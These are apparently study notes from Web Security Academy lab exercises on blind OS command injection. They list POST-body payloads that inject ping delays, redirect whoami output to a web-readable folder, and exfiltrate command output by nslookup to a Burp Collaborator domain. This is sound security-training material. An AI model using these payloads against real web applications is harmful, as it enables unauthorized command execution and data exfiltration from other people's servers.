## OS Command Injection Vulnerabilities:
- ==Blind OS command injection with time delays== POST body:
  csrf=CSRF_token&name=Test&email=t==||ping+-c+10+127.0.0.1||==&subject=TEst&message=Test
- ==Blind OS command injection with output redirection== csrf=CSRF_token&name=Test&email\===||whoami>/var/www/images/output.txt||==&subject=TEst&message=zyrdy
  
  The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
  
  `/var/www/images/`
  https://lab_id.web-security-academy.net/image?filename=output.txt
- ==Blind OS command injection with out-of-band exfiltration== 
  csrf=CSRF_token&name=Test&email=||nslookup+`whoami`.burp_collaborator.oastify.com||&subject=Test&message=Test